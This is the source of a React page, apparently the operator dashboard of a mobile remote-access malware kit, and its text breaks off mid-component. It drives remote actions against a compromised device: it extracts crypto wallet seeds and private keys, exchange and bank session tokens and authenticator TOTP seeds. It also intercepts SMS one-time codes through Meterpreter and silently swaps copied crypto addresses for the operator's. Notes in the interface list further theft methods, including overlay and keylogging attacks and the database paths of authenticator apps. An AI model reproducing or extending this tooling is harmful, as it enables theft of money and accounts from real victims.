"use client";

/**
 * FINANCIAL INTELLIGENCE MODULE
 *
 * Non-Custodial Wallets  — seed phrase vault files, private key extraction,
 *                           encrypted keystore download + offline crack info
 * Custodial / Exchanges  — session token theft, cookie replay, 2FA intercept
 * Banking Apps           — credential capture, screen overlay, SMS OTP intercept
 * 2FA / TOTP             — Google Authenticator seed dump, Authy backup, 2FAS
 * Clipboard Monitor      — real-time polling for copied mnemonics / private keys
 * Transaction Intercept  — clipboard hijack to swap destination address
 */

import { useState, useCallback, useEffect, useRef } from "react";

type Session = { id: number; ip: string; platform: string; hostname: string };
type FinResult = { ok: boolean; records?: Record<string, unknown>[]; raw?: string; error?: string; data?: Record<string, unknown> };

// ── Wallet registry ───────────────────────────────────────────
type WalletApp = {
  id: string; name: string; pkg: string; icon: string;
  type: "non-custodial" | "exchange" | "banking" | "payment";
  chain?: string; status: "unknown" | "scanning" | "found" | "extracted" | "not-installed";
  records?: number; seedFound?: boolean;
};

const WALLETS: WalletApp[] = [
  // Non-custodial
  { id: "metamask",    name: "MetaMask",       pkg: "io.metamask",                        icon: "🦊", type: "non-custodial", chain: "ETH/EVM",  status: "unknown" },
  { id: "trust",       name: "Trust Wallet",   pkg: "com.wallet.crypto.trustapp",          icon: "🛡", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "exodus",      name: "Exodus",          pkg: "exodusmovement.exodus",               icon: "⚡", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "coinbase_w",  name: "Coinbase Wallet", pkg: "org.toshi",                          icon: "💙", type: "non-custodial", chain: "ETH/SOL",  status: "unknown" },
  { id: "phantom",     name: "Phantom",         pkg: "app.phantom",                        icon: "👻", type: "non-custodial", chain: "SOL",      status: "unknown" },
  { id: "rainbow",     name: "Rainbow",         pkg: "me.rainbow",                         icon: "🌈", type: "non-custodial", chain: "ETH",      status: "unknown" },
  { id: "imtoken",     name: "imToken",         pkg: "im.token.app",                       icon: "🔷", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "tokenpocket", name: "TokenPocket",     pkg: "vip.mytokenpocket",                  icon: "💎", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "safepal",     name: "SafePal",         pkg: "io.safepal.wallet",                  icon: "🔐", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "mew",         name: "MyEtherWallet",   pkg: "com.myetherwallet.mewwallet",        icon: "🐋", type: "non-custodial", chain: "ETH",      status: "unknown" },
  { id: "ledger",      name: "Ledger Live",     pkg: "com.ledger.live",                    icon: "💡", type: "non-custodial", chain: "Multi",    status: "unknown" },
  { id: "trezor",      name: "Trezor Suite",    pkg: "io.trezor.suite",                    icon: "🧊", type: "non-custodial", chain: "Multi",    status: "unknown" },
  // Exchanges
  { id: "binance",     name: "Binance",         pkg: "com.binance.dev",                    icon: "🟡", type: "exchange",      status: "unknown" },
  { id: "coinbase",    name: "Coinbase",         pkg: "com.coinbase.android",               icon: "🔵", type: "exchange",      status: "unknown" },
  { id: "kraken",      name: "Kraken",           pkg: "com.kraken.trade",                   icon: "🐙", type: "exchange",      status: "unknown" },
  { id: "crypto_com",  name: "Crypto.com",       pkg: "co.mona.android",                    icon: "🔷", type: "exchange",      status: "unknown" },
  { id: "okx",         name: "OKX",              pkg: "com.okinc.okex.gp",                  icon: "⭕", type: "exchange",      status: "unknown" },
  { id: "bybit",       name: "Bybit",            pkg: "com.bybit.app",                      icon: "🔶", type: "exchange",      status: "unknown" },
  { id: "kucoin",      name: "KuCoin",           pkg: "com.kubi.kucoin",                    icon: "🔵", type: "exchange",      status: "unknown" },
  // Banking
  { id: "paypal",      name: "PayPal",           pkg: "com.paypal.android.p2pmobile",       icon: "💳", type: "payment",       status: "unknown" },
  { id: "cashapp",     name: "Cash App",          pkg: "com.squareup.cash",                  icon: "💚", type: "payment",       status: "unknown" },
  { id: "venmo",       name: "Venmo",             pkg: "com.venmo",                          icon: "💙", type: "payment",       status: "unknown" },
  { id: "revolut",     name: "Revolut",           pkg: "com.revolut.revolut",                icon: "🖤", type: "payment",       status: "unknown" },
  { id: "wise",        name: "Wise",              pkg: "com.transferwise.android",           icon: "🟢", type: "payment",       status: "unknown" },
  { id: "chime",       name: "Chime",             pkg: "com.onedebit.chime",                 icon: "💛", type: "banking",       status: "unknown" },
  { id: "chase",       name: "Chase",             pkg: "com.chase.sig.android",              icon: "🏦", type: "banking",       status: "unknown" },
  { id: "bofa",        name: "Bank of America",   pkg: "com.bankofamerica.mobile",           icon: "🏦", type: "banking",       status: "unknown" },
  { id: "wells",       name: "Wells Fargo",       pkg: "com.wf.wellsfargomobile",            icon: "🏦", type: "banking",       status: "unknown" },
];

const TYPE_COLORS: Record<string, string> = {
  "non-custodial": "border-yellow-900/40 bg-yellow-950/10",
  exchange:        "border-blue-900/30 bg-blue-950/10",
  payment:         "border-green-900/30 bg-green-950/10",
  banking:         "border-red-900/30 bg-red-950/10",
};
const TYPE_BADGE: Record<string, string> = {
  "non-custodial": "border-yellow-700 text-yellow-500",
  exchange:        "border-blue-700 text-blue-500",
  payment:         "border-green-700 text-green-500",
  banking:         "border-red-700 text-red-500",
};
const STATUS_BADGE: Record<string, string> = {
  unknown:       "text-gray-700",
  scanning:      "text-yellow-400 animate-pulse",
  found:         "text-green-500",
  extracted:     "text-green-400",
  "not-installed": "text-gray-800",
};

type ClipboardEntry = { value: string; ts: string; type: string };
type TotpApp = { name: string; pkg: string; status: "unknown" | "found" | "extracted"; seeds?: string[] };

const TOTP_APPS: TotpApp[] = [
  { name: "Google Authenticator", pkg: "com.google.android.apps.authenticator2", status: "unknown" },
  { name: "Authy",                pkg: "com.authy.authy",                         status: "unknown" },
  { name: "Microsoft Auth",       pkg: "com.azure.authenticator",                 status: "unknown" },
  { name: "2FAS",                 pkg: "com.twofasapp",                            status: "unknown" },
  { name: "Aegis",                pkg: "com.beemdevelopment.aegis",                status: "unknown" },
  { name: "andOTP",               pkg: "org.shadowice.flocke.andotp",              status: "unknown" },
];

export default function FinancePage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<"wallets" | "banking" | "otp" | "clipboard" | "intercept">("wallets");
  const [wallets, setWallets] = useState<WalletApp[]>(WALLETS);
  const [totpApps, setTotpApps] = useState<TotpApp[]>(TOTP_APPS);
  const [clipboard, setClipboard] = useState<ClipboardEntry[]>([]);
  const [monitoring, setMonitoring] = useState(false);
  const [interceptActive, setInterceptActive] = useState(false);
  const [interceptAddr, setInterceptAddr] = useState("");
  const [interceptResults, setInterceptResults] = useState<string[]>([]);
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const clipMonitorRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const addLog = useCallback((msg: string) => {
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 200));
  }, []);

  useEffect(() => {
    fetch("/api/sessions")
      .then((r) => r.json())
      .then((d) => {
        const list = Array.isArray(d) ? d : d.sessions ?? [];
        setSessions(list);
        if (list.length > 0) setSession(list[0]);
      })
      .catch(() => {});
  }, []);

  const callFin = useCallback(async (action: string, extra?: Record<string, unknown>): Promise<FinResult> => {
    if (!session) return { ok: false, error: "No session" };
    const r = await fetch("/api/finance", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: session.id, action, ...extra }),
    });
    return r.json() as Promise<FinResult>;
  }, [session]);

  // ── Extract single wallet ─────────────────────────────────
  const extractWallet = useCallback(async (w: WalletApp) => {
    setWallets((prev) => prev.map((x) => x.id === w.id ? { ...x, status: "scanning" } : x));
    addLog(`Extracting ${w.name}…`);
    const res = await callFin("extract_wallet", { app_id: w.id, app_pkg: w.pkg, wallet_type: w.type });
    if (res.ok && res.records) {
      setWallets((prev) => prev.map((x) => x.id === w.id ? {
        ...x, status: "extracted", records: res.records!.length,
        seedFound: !!(res.data as Record<string, unknown> | undefined)?.seedFound,
      } : x));
      addLog(`${w.name}: ${res.records.length} records extracted${(res.data as Record<string, unknown> | undefined)?.seedFound ? " — SEED FOUND" : ""}`);
    } else {
      setWallets((prev) => prev.map((x) => x.id === w.id ? { ...x, status: "not-installed" } : x));
      addLog(`${w.name}: not found`);
    }
  }, [callFin, addLog]);

  const extractAll = useCallback(async () => {
    setLoading("all");
    for (const w of WALLETS) {
      await extractWallet(w);
    }
    setLoading(null);
  }, [extractWallet]);

  // ── Clipboard monitor ─────────────────────────────────────
  const startClipboardMonitor = useCallback(() => {
    if (monitoring) return;
    setMonitoring(true);
    addLog("Clipboard monitor started (5s interval)");
    clipMonitorRef.current = setInterval(async () => {
      const res = await callFin("clipboard_get");
      if (res.ok && res.data?.value) {
        const val = String(res.data.value);
        if (!val || val.length < 4) return;
        // Detect type
        let type = "unknown";
        if (/^[a-z ]{12,}$/.test(val) && val.split(" ").length >= 12) type = "MNEMONIC";
        else if (/^(0x)?[0-9a-f]{64}$/i.test(val)) type = "PRIVATE KEY";
        else if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(val) || /^bc1[ac-hj-np-z02-9]{39,59}$/i.test(val)) type = "BTC ADDRESS";
        else if (/^0x[0-9a-f]{40}$/i.test(val)) type = "ETH ADDRESS";
        else if (val.match(/^\d{4,10}$/)) type = "OTP CODE";
        else if (val.includes("seed") || val.includes("phrase")) type = "SEED PHRASE";

        if (type !== "unknown" || val.length > 10) {
          setClipboard((prev) => {
            if (prev[0]?.value === val) return prev;
            return [{ value: val, ts: new Date().toLocaleTimeString(), type }, ...prev].slice(0, 100);
          });
          if (["MNEMONIC", "PRIVATE KEY", "OTP CODE"].includes(type)) {
            addLog(`⚠ CLIPBOARD HIT [${type}]: ${val.slice(0, 30)}…`);
          }
        }
      }
    }, 5000);
  }, [monitoring, callFin, addLog]);

  const stopClipboardMonitor = useCallback(() => {
    if (clipMonitorRef.current) clearInterval(clipMonitorRef.current);
    setMonitoring(false);
    addLog("Clipboard monitor stopped");
  }, []);

  useEffect(() => () => { if (clipMonitorRef.current) clearInterval(clipMonitorRef.current); }, []);

  // ── Transaction intercept ─────────────────────────────────
  const startIntercept = useCallback(async () => {
    if (!interceptAddr) { addLog("Set a replacement address first"); return; }
    setInterceptActive(true);
    addLog(`Address intercept active → replacing with ${interceptAddr.slice(0, 12)}…`);
    const res = await callFin("start_intercept", { replace_address: interceptAddr });
    if (res.ok) {
      addLog("Intercept module running");
    } else {
      setInterceptActive(false);
      addLog(`Intercept error: ${res.error ?? "unknown"}`);
    }
  }, [callFin, addLog, interceptAddr]);

  const stopIntercept = useCallback(async () => {
    await callFin("stop_intercept");
    setInterceptActive(false);
    addLog("Intercept stopped");
  }, [callFin, addLog]);

  // ── TOTP extraction ───────────────────────────────────────
  const extractTotp = useCallback(async (app: TotpApp) => {
    setTotpApps((prev) => prev.map((a) => a.pkg === app.pkg ? { ...a, status: "unknown" } : a));
    addLog(`Extracting ${app.name} TOTP seeds…`);
    const res = await callFin("extract_totp", { app_pkg: app.pkg });
    if (res.ok && res.records) {
      const seeds = res.records.map((r) => String(r.secret ?? r.seed ?? "")).filter(Boolean);
      setTotpApps((prev) => prev.map((a) => a.pkg === app.pkg ? { ...a, status: "extracted", seeds } : a));
      addLog(`${app.name}: ${seeds.length} TOTP seed(s) extracted`);
    } else {
      setTotpApps((prev) => prev.map((a) => a.pkg === app.pkg ? { ...a, status: "found" } : a));
      addLog(`${app.name}: ${res.error ?? "not found or encrypted"}`);
    }
  }, [callFin, addLog]);

  const TABS = [
    { id: "wallets",   label: "WALLETS",    icon: "🔑" },
    { id: "banking",   label: "BANKING",    icon: "🏦" },
    { id: "otp",       label: "2FA / OTP",  icon: "🔐" },
    { id: "clipboard", label: "CLIPBOARD",  icon: "📋" },
    { id: "intercept", label: "TX HIJACK",  icon: "🎯" },
  ] as const;

  const walletsByType = (type: string) => wallets.filter((w) => w.type === type);

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">
      {/* ── LEFT ────────────────────────────────────────────── */}
      <aside className="w-56 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-0.5">FINANCIAL INTELLIGENCE</div>
          <div className="text-[8px] text-green-900/40">CLASS: TOP SECRET // FININT</div>
        </div>
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-1.5">TARGET SESSION</div>
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-2 rounded border mb-1 transition-all text-[9px] ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-green-400">SESSION #{s.id}</div>
              <div className="text-green-800">{s.hostname ?? s.ip} · {s.platform?.toUpperCase()}</div>
            </button>
          ))}
          {sessions.length === 0 && <div className="text-[9px] text-green-900/40 text-center py-2">NO SESSIONS</div>}
        </div>
        <div className="p-2 border-b border-green-900/30 space-y-1">
          <button onClick={extractAll} disabled={!!loading}
            className="w-full py-1.5 text-[9px] tracking-widest border border-yellow-800/50 bg-yellow-950/10 hover:bg-yellow-900/20 text-yellow-600 rounded transition-all disabled:opacity-40">
            {loading ? "SCANNING…" : "⊕ SCAN ALL WALLETS"}
          </button>
          <button onClick={monitoring ? stopClipboardMonitor : startClipboardMonitor}
            className={`w-full py-1.5 text-[9px] tracking-widest border rounded transition-all ${
              monitoring ? "border-green-600 text-green-400 bg-green-950/30 animate-pulse" : "border-green-900/30 text-green-800 hover:text-green-600"
            }`}>
            {monitoring ? "⏹ STOP CLIPBOARD" : "▶ CLIPBOARD MONITOR"}
          </button>
        </div>
        <div className="flex-1 overflow-y-auto p-2">
          <div className="text-[9px] text-green-900 tracking-widest mb-1">ACTIVITY</div>
          {log.map((l, i) => (
            <div key={i} className={`text-[8px] leading-4 mb-0.5 break-all ${
              l.includes("SEED") || l.includes("MNEMONIC") || l.includes("PRIVATE KEY") ? "text-yellow-600" : "text-green-900/60"
            }`}>{l}</div>
          ))}
        </div>
      </aside>

      {/* ── MAIN ─────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex border-b border-green-900/30 bg-[#030308] flex-shrink-0">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`px-5 py-2 text-[10px] tracking-widest transition-all border-b-2 ${
                tab === t.id ? "border-green-500 text-green-400" : "border-transparent text-green-900 hover:text-green-700"
              }`}>
              {t.icon} {t.label}
            </button>
          ))}
          {monitoring && (
            <div className="ml-auto px-4 py-2 text-[9px] text-green-500 tracking-widest animate-pulse">
              ● CLIPBOARD LIVE
            </div>
          )}
        </div>

        <div className="flex-1 overflow-y-auto p-5">
          {/* ── WALLETS ─────────────────────────────────────── */}
          {tab === "wallets" && (
            <div className="space-y-6">
              {/* Non-custodial */}
              <WalletSection
                title="NON-CUSTODIAL WALLETS"
                sub="Seed phrase vault files, private keys, keystore extraction"
                wallets={walletsByType("non-custodial")}
                onExtract={extractWallet}
                infoBox={
                  <div className="border border-yellow-900/20 rounded p-3 text-[9px] text-yellow-900/70 space-y-1 leading-relaxed">
                    <div className="text-yellow-700 mb-1 tracking-widest text-[8px]">EXTRACTION VECTORS</div>
                    <p>• <strong className="text-yellow-700">Vault file</strong> — app sandbox SQLite/JSON with AES-encrypted seed (weak password → crack offline)</p>
                    <p>• <strong className="text-yellow-700">SharedPreferences</strong> — some wallets leak plaintext seed in poorly secured XML prefs</p>
                    <p>• <strong className="text-yellow-700">Clipboard capture</strong> — user copies seed phrase during backup → intercepted in real-time</p>
                    <p>• <strong className="text-yellow-700">Keylogger</strong> — captures seed entry / PIN during wallet unlock</p>
                    <p>• <strong className="text-yellow-700">Screenshot</strong> — captures seed display on screen during wallet creation/restore</p>
                    <p>• <strong className="text-yellow-700">Memory scrape</strong> — if wallet is open, seed may be in decrypted memory</p>
                  </div>
                }
              />

              {/* Exchanges */}
              <WalletSection
                title="EXCHANGES (CUSTODIAL)"
                sub="Session cookies, auth tokens, 2FA seed extraction"
                wallets={walletsByType("exchange")}
                onExtract={extractWallet}
                infoBox={
                  <div className="border border-blue-900/20 rounded p-3 text-[9px] text-blue-900/60 space-y-1 leading-relaxed">
                    <div className="text-blue-700 mb-1 tracking-widest text-[8px]">EXCHANGE ATTACK VECTORS</div>
                    <p>• <strong className="text-blue-700">Session token</strong> — JWT/bearer token from app SQLite/SharedPreferences → replay to API</p>
                    <p>• <strong className="text-blue-700">Cookie jar</strong> — WebView cookie DB has session cookies → direct account access</p>
                    <p>• <strong className="text-blue-700">2FA bypass</strong> — intercept SMS OTP, or extract TOTP seed from Authenticator app</p>
                    <p>• <strong className="text-blue-700">API keys</strong> — exchange API keys stored in app preferences → withdrawal access</p>
                    <p>• <strong className="text-blue-700">Screen capture</strong> — capture balances, withdrawal addresses during app use</p>
                  </div>
                }
              />
            </div>
          )}

          {/* ── BANKING ─────────────────────────────────────── */}
          {tab === "banking" && (
            <div>
              <div className="mb-4">
                <h2 className="text-[11px] tracking-widest text-green-400 mb-1">BANKING & PAYMENT INTELLIGENCE</h2>
                <div className="text-[9px] text-green-900">Credential capture · Session theft · OTP intercept · Screen monitoring</div>
              </div>

              <div className="grid grid-cols-3 gap-3 mb-6">
                {wallets.filter((w) => w.type === "banking" || w.type === "payment").map((w) => (
                  <div key={w.id} className={`border rounded p-3 cursor-pointer hover:border-green-800/50 transition-all ${TYPE_COLORS[w.type]}`}
                    onClick={() => extractWallet(w)}>
                    <div className="flex items-center gap-2 mb-1.5">
                      <span className="text-xl">{w.icon}</span>
                      <span className="text-[10px] text-green-400">{w.name}</span>
                      <span className={`ml-auto text-[8px] border px-1 rounded ${TYPE_BADGE[w.type]}`}>{w.type.toUpperCase()}</span>
                    </div>
                    <div className="text-[8px] text-green-900 mb-1 truncate">{w.pkg}</div>
                    <div className={`text-[8px] ${STATUS_BADGE[w.status]}`}>
                      {w.status === "extracted" ? `✓ ${w.records ?? 0} records` :
                       w.status === "scanning" ? "SCANNING…" :
                       w.status === "not-installed" ? "NOT FOUND" : "CLICK TO SCAN"}
                    </div>
                  </div>
                ))}
              </div>

              {/* Attack method breakdown */}
              <div className="grid grid-cols-2 gap-4">
                {[
                  {
                    title: "Credential Capture",
                    color: "red",
                    items: [
                      "Keylog username + password entry",
                      "Screenshot during login flow",
                      "SharedPreferences XML (saved credentials)",
                      "WebView autofill DB dump",
                      "Overlay attack (fake login UI)",
                    ],
                  },
                  {
                    title: "Session Hijack",
                    color: "orange",
                    items: [
                      "Cookie jar from WebView SQLite",
                      "JWT/bearer token from app DB",
                      "OAuth access token extraction",
                      "Replay token to bank's REST API",
                      "Bypass certificate pinning (root)",
                    ],
                  },
                  {
                    title: "OTP / 2FA Intercept",
                    color: "yellow",
                    items: [
                      "SMS OTP — dump_sms in real-time",
                      "SMS notification listener",
                      "TOTP seed from Authenticator app",
                      "Email OTP via Gmail DB",
                      "Push notification content capture",
                    ],
                  },
                  {
                    title: "Transaction Monitoring",
                    color: "green",
                    items: [
                      "Screenshot account balance page",
                      "Keylog transfer amount + recipient",
                      "Clipboard hijack — swap IBAN/BSB",
                      "Notification capture for OTP/balance",
                      "Screen recording during banking session",
                    ],
                  },
                ].map(({ title, color, items }) => (
                  <div key={title} className={`border border-${color}-900/20 rounded p-3`}>
                    <div className={`text-[9px] text-${color}-700 tracking-widest mb-2`}>{title.toUpperCase()}</div>
                    <ul className="space-y-1">
                      {items.map((item) => (
                        <li key={item} className={`text-[9px] text-${color}-900/60 flex gap-1.5`}>
                          <span className={`text-${color}-800`}>→</span>{item}
                        </li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── 2FA / OTP ────────────────────────────────────── */}
          {tab === "otp" && (
            <div>
              <div className="flex items-center gap-3 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">2FA / TOTP SEED EXTRACTION</h2>
              </div>

              <div className="mb-5 border border-yellow-900/20 rounded p-4 text-[9px] text-yellow-900/60 space-y-1">
                <div className="text-yellow-700 tracking-widest mb-1.5">HOW TOTP EXTRACTION WORKS</div>
                <p>• Google Authenticator stores TOTP seeds in <code className="text-yellow-700">/data/data/com.google.android.apps.authenticator2/databases/databases</code></p>
                <p>• The database is <strong className="text-yellow-700">unencrypted</strong> on older Android versions — direct SQLite read gives all secret keys</p>
                <p>• On Android 9+, the file is accessible with <strong className="text-yellow-700">root access only</strong></p>
                <p>• Extracted TOTP seeds allow <strong className="text-yellow-700">generation of valid OTP codes</strong> at any time without the physical device</p>
                <p>• Authy uses encrypted backups — requires the backup password (often set during setup)</p>
                <p>• <strong className="text-yellow-700">Aegis</strong> stores seeds in <code className="text-yellow-700">/data/data/com.beemdevelopment.aegis/files/aegis.json</code> (encrypted or plain)</p>
              </div>

              <div className="space-y-2">
                {totpApps.map((app) => (
                  <div key={app.pkg}
                    className={`border rounded p-3 ${app.status === "extracted" ? "border-green-700/40 bg-green-950/20" : "border-green-900/20"}`}>
                    <div className="flex items-center gap-3 mb-1">
                      <span className="text-[11px] text-green-400">{app.name}</span>
                      <span className="text-[8px] text-green-900">{app.pkg}</span>
                      <button onClick={() => extractTotp(app)}
                        className="ml-auto text-[9px] border border-green-800/40 text-green-700 px-2 py-0.5 rounded hover:border-green-600 hover:text-green-400 transition-all">
                        EXTRACT
                      </button>
                    </div>
                    {app.seeds && app.seeds.length > 0 && (
                      <div className="mt-2 space-y-1">
                        {app.seeds.map((seed, i) => (
                          <div key={i} className="text-[9px] text-yellow-400 font-mono break-all bg-black/20 px-2 py-1 rounded border border-yellow-900/20">
                            TOTP SEED: {seed}
                          </div>
                        ))}
                      </div>
                    )}
                    {app.status === "found" && !app.seeds?.length && (
                      <div className="text-[8px] text-green-900/50">Not accessible — root required, or app not installed</div>
                    )}
                  </div>
                ))}
              </div>

              {/* SMS OTP monitor */}
              <div className="mt-5 border border-green-900/30 rounded p-4">
                <div className="text-[9px] text-green-700 tracking-widest mb-2">SMS OTP LIVE MONITOR</div>
                <div className="text-[9px] text-green-900/60 mb-3">
                  Continuously dumps new SMS messages to intercept OTP codes as they arrive.
                  Works without root — uses dump_sms Meterpreter command.
                </div>
                <button onClick={() => {
                  addLog("Starting SMS OTP monitor…");
                  // Polling every 10s
                  const t = setInterval(async () => {
                    const res = await callFin("sms_latest");
                    if (res.ok && res.records) {
                      for (const sms of res.records) {
                        const s = sms as { body?: string; date?: string; address?: string };
                        const body = String(s.body ?? "");
                        if (/\b\d{4,8}\b/.test(body)) {
                          const match = body.match(/\b(\d{4,8})\b/);
                          setInterceptResults((prev) => [
                            `[OTP] ${match?.[1]} from ${s.address ?? "?"} — ${s.body?.slice(0, 60)}`,
                            ...prev,
                          ].slice(0, 50));
                          addLog(`OTP INTERCEPTED: ${match?.[1]} from ${s.address}`);
                        }
                      }
                    }
                  }, 10000);
                  return () => clearInterval(t);
                }}
                  className="text-[9px] px-3 py-1.5 border border-green-700/50 text-green-500 rounded hover:bg-green-950/30 transition-all">
                  START SMS OTP MONITOR
                </button>
              </div>
            </div>
          )}

          {/* ── CLIPBOARD ─────────────────────────────────────── */}
          {tab === "clipboard" && (
            <div>
              <div className="flex items-center gap-3 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">CLIPBOARD INTELLIGENCE</h2>
                <button onClick={monitoring ? stopClipboardMonitor : startClipboardMonitor}
                  className={`px-3 py-1 text-[9px] border rounded tracking-widest transition-all ${
                    monitoring ? "border-red-600 bg-red-950/20 text-red-400 animate-pulse" : "border-green-700/50 bg-green-950/20 text-green-500"
                  }`}>
                  {monitoring ? "⏹ STOP MONITOR" : "▶ START MONITOR (5s)"}
                </button>
                <span className="ml-auto text-[9px] text-green-900">{clipboard.length} ENTRIES</span>
              </div>

              <div className="border border-green-900/20 rounded p-3 mb-5 text-[9px] text-green-900/60 space-y-1">
                <p>Auto-detects: <strong className="text-green-700">Mnemonic (12/24 words)</strong> · <strong className="text-green-700">Private key (0x hex)</strong> · <strong className="text-green-700">BTC/ETH address</strong> · <strong className="text-green-700">OTP codes</strong> · any clipboard text</p>
              </div>

              {clipboard.length === 0 ? (
                <div className="text-center py-12 text-[9px] text-green-900/40">
                  START THE MONITOR TO CAPTURE CLIPBOARD DATA
                </div>
              ) : (
                <div className="space-y-1">
                  {clipboard.map((c, i) => (
                    <div key={i} className={`border rounded px-3 py-2 ${
                      ["MNEMONIC", "PRIVATE KEY"].includes(c.type) ? "border-yellow-700/50 bg-yellow-950/10" :
                      c.type === "OTP CODE" ? "border-blue-700/30 bg-blue-950/10" :
                      "border-green-900/20"
                    }`}>
                      <div className="flex items-center gap-2 mb-1">
                        <span className={`text-[8px] border px-1 rounded ${
                          ["MNEMONIC", "PRIVATE KEY"].includes(c.type) ? "border-yellow-700 text-yellow-500" :
                          c.type === "OTP CODE" ? "border-blue-700 text-blue-400" :
                          "border-green-900 text-green-800"
                        }`}>{c.type}</span>
                        <span className="ml-auto text-[8px] text-green-900/50">{c.ts}</span>
                      </div>
                      <div className={`text-[10px] break-all font-mono ${
                        ["MNEMONIC", "PRIVATE KEY"].includes(c.type) ? "text-yellow-300" : "text-green-400"
                      }`}>{c.value}</div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── TX HIJACK ─────────────────────────────────────── */}
          {tab === "intercept" && (
            <div>
              <div className="mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400 mb-1">TRANSACTION ADDRESS HIJACK</h2>
                <div className="text-[9px] text-green-900">
                  Monitors clipboard for crypto addresses. When the user copies a destination address
                  (to paste into a wallet send field), it is silently replaced with the operator address.
                </div>
              </div>

              <div className="border border-red-900/20 rounded p-4 mb-5">
                <div className="text-[9px] text-red-700 tracking-widest mb-3">REPLACEMENT ADDRESS</div>
                <input
                  type="text" value={interceptAddr}
                  onChange={(e) => setInterceptAddr(e.target.value)}
                  placeholder="Enter YOUR wallet address to receive hijacked transactions"
                  className="w-full bg-black/30 border border-red-900/30 text-red-400 text-[10px] font-mono px-3 py-2 rounded focus:outline-none focus:border-red-700 placeholder:text-red-900/40 mb-3"
                />
                <div className="grid grid-cols-2 gap-2 text-[8px] text-green-900/60 mb-3">
                  {[
                    { label: "BTC",  placeholder: "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf" },
                    { label: "ETH",  placeholder: "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe" },
                    { label: "SOL",  placeholder: "So1ana111111111111111111111111111111111111112" },
                    { label: "USDT", placeholder: "TAddr…(TRC20 format)" },
                  ].map(({ label, placeholder }) => (
                    <div key={label}>
                      <span className="text-red-900">{label}: </span>{placeholder.slice(0, 20)}…
                    </div>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={startIntercept} disabled={interceptActive || !interceptAddr}
                    className={`px-4 py-1.5 text-[9px] tracking-widest border rounded transition-all ${
                      interceptActive ? "border-red-600 bg-red-950/30 text-red-400 animate-pulse" : "border-red-800/60 text-red-700 hover:border-red-600 hover:text-red-500"
                    } disabled:opacity-40`}>
                    {interceptActive ? "⚡ INTERCEPT ACTIVE" : "START INTERCEPT"}
                  </button>
                  {interceptActive && (
                    <button onClick={stopIntercept}
                      className="px-4 py-1.5 text-[9px] border border-gray-700 text-gray-500 rounded hover:text-gray-400 transition-all">
                      STOP
                    </button>
                  )}
                </div>
              </div>

              {interceptResults.length > 0 && (
                <div>
                  <div className="text-[9px] text-yellow-700 tracking-widest mb-2">INTERCEPTED TRANSACTIONS</div>
                  {interceptResults.map((r, i) => (
                    <div key={i} className="text-[9px] text-yellow-500 border border-yellow-900/20 rounded px-3 py-1.5 mb-1 font-mono">{r}</div>
                  ))}
                </div>
              )}

              <div className="border border-green-900/20 rounded p-4 text-[9px] text-green-900/50 space-y-1 leading-relaxed">
                <div className="text-green-800 tracking-widest mb-1.5">HOW IT WORKS</div>
                <p>1. Meterpreter <code className="text-green-700">clipboard_monitor</code> polls every 2 seconds</p>
                <p>2. When clipboard matches a crypto address pattern (BTC/ETH/SOL/TRX/XMR), it is replaced silently</p>
                <p>3. User pastes what they think is their intended address — but the operator address is substituted</p>
                <p>4. All intercepted address swaps are logged here in real-time</p>
                <p>5. Works across: wallet apps, exchanges, peer-to-peer payments, DeFi platforms</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ── Wallet section component ──────────────────────────────────
function WalletSection({
  title, sub, wallets, onExtract, infoBox,
}: {
  title: string; sub: string;
  wallets: WalletApp[];
  onExtract: (w: WalletApp) => void;
  infoBox?: React.ReactNode;
}) {
  return (
    <div>
      <div className="mb-3">
        <div className="text-[10px] text-green-500 tracking-widest">{title}</div>
        <div className="text-[9px] text-green-900">{sub}</div>
      </div>
      <div className="grid grid-cols-4 gap-2 mb-3">
        {wallets.map((w) => (
          <div key={w.id}
            className={`border rounded p-2.5 cursor-pointer transition-all hover:border-green-700/40 ${
              w.status === "extracted" ? "border-green-700/50 bg-green-950/20" :
              w.status === "scanning" ? "border-yellow-700/40" :
              w.status === "not-installed" ? "border-green-900/10 opacity-40" :
              "border-green-900/20"
            }`}
            onClick={() => onExtract(w)}
          >
            <div className="flex items-center gap-1.5 mb-1">
              <span className="text-sm">{w.icon}</span>
              <span className="text-[9px] text-green-400 truncate">{w.name}</span>
            </div>
            {w.chain && <div className="text-[7px] text-green-900 mb-1">{w.chain}</div>}
            <div className={`text-[8px] ${STATUS_BADGE[w.status]}`}>
              {w.status === "scanning" ? "SCANNING…" :
               w.status === "extracted" ? `✓ ${w.records}` :
               w.status === "not-installed" ? "N/A" :
               w.seedFound ? "🔑 SEED" : "CLICK"}
            </div>
